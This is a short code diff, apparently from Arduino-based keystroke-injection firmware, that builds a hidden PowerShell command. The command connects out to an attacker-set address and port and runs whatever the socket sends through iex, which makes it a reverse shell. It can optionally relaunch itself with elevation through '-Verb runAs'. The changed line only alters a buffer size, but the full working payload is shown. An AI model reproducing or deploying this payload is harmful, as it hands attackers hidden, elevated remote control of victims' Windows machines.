@@ -90,7 +90,7 @@ void setup() {
   // Prepare the PowerhShell TCP Client
   String sPowerShellCmd = "powershell -w 1 "; 
   if (bUAC) { sPowerShellCmd += "saps powershell -A '-NoE -W 1',{"; }  
-  sPowerShellCmd += "$u=(New-Object Net.Sockets.TCPClient('" + sAddr + "'," + sPort + ")).GetStream();[byte[]]$w=0..65535|%{0};";
+  sPowerShellCmd += "$u=(New-Object Net.Sockets.TCPClient('" + sAddr + "'," + sPort + ")).GetStream();[byte[]]$w=0..64KB|%{0};";
   sPowerShellCmd += "while(($i=$u.Read($w,0,$w.Length))-ne0){$d=([text.encoding]::UTF8).GetString($w,0,$i);(iex $d)}";
   if (bUAC) { sPowerShellCmd += "} -Verb runAs"; }
 
